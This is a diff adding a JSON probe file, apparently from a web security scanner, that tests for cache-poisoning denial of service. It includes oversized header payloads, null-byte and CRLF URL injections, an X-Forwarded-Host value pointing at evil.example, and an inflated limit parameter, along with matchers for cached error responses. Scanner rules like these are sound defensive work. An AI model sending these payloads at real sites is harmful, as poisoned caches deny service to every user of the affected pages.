@@ -1,0 +1,105 @@
+{
+  "category": "web_cache_poisoning_dos",
+  "contexts": {
+    "header_oversize": {
+      "description": "Cache DoS via HTTP Header Oversize (HHO) -- send oversized headers that trigger error responses cached by intermediary",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx", "Apache"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Oversized X-Forwarded-For header -- send extremely long XFF header to trigger 400/431 error that gets cached, denying service to all users requesting same URL",
+          "matchers": [
+            {"type": "status", "status": [400, 431]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 55,
+          "variables": {"header": "X-Forwarded-For: swktest-hho-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Oversized Cookie header for cache DoS -- large Cookie header triggers 400 error cached for all users",
+          "matchers": [
+            {"type": "status", "status": [400, 431]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 50,
+          "variables": {"header": "Cookie: swk_dos=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+        }
+      ]
+    },
+    "cache_key_normalization": {
+      "description": "Cache key normalization DoS -- exploit differences in URL normalization between cache and origin to poison cache with error responses",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}%00swktest",
+          "description": "Null byte in URL for cache DoS -- cache normalizes away null byte (same key as clean URL), origin returns 400, cached error serves to all users",
+          "matchers": [
+            {"type": "status", "status": [400, 404]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%0d%0aswktest",
+          "description": "CRLF in URL path for cache DoS -- cache strips CRLF when computing key, origin rejects with error, error is cached for clean URL",
+          "matchers": [
+            {"type": "status", "status": [400]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "vary_header_abuse": {
+      "description": "Vary header abuse for cache DoS -- manipulate Vary header to fragment cache or cause cache misses",
+      "tech_match": ["Varnish", "Cloudflare", "Nginx", "Apache"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Inject X-Forwarded-Host to influence Vary -- if server adds injected header to Vary response, cache fragments per unique value, reducing cache hit rate (DoS via cache fragmentation)",
+          "matchers": [
+            {"type": "header", "name": "Vary", "contains": "X-Forwarded"},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {"header": "X-Forwarded-Host: swktest-vary-{{marker}}.evil.example"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Vary: * detection -- server returning Vary: * makes response uncacheable, potential amplification if attacker can trigger this",
+          "matchers": [
+            {"type": "header", "name": "Vary", "contains": "*"}
+          ],
+          "severity": "low",
+          "confidence_boost": 20
+        }
+      ]
+    },
+    "large_response_caching": {
+      "description": "Cache DoS via large response -- trigger large error responses that consume cache storage or bandwidth",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly"],
+      "param_match": ["q", "search", "query", "page", "limit", "size", "count"],
+      "probes": [
+        {
+          "payload": "{{baseline}}&limit=999999",
+          "description": "Large response via inflated limit parameter -- trigger oversized response that consumes cache storage when cached",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 10000},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    }
+  }
+}
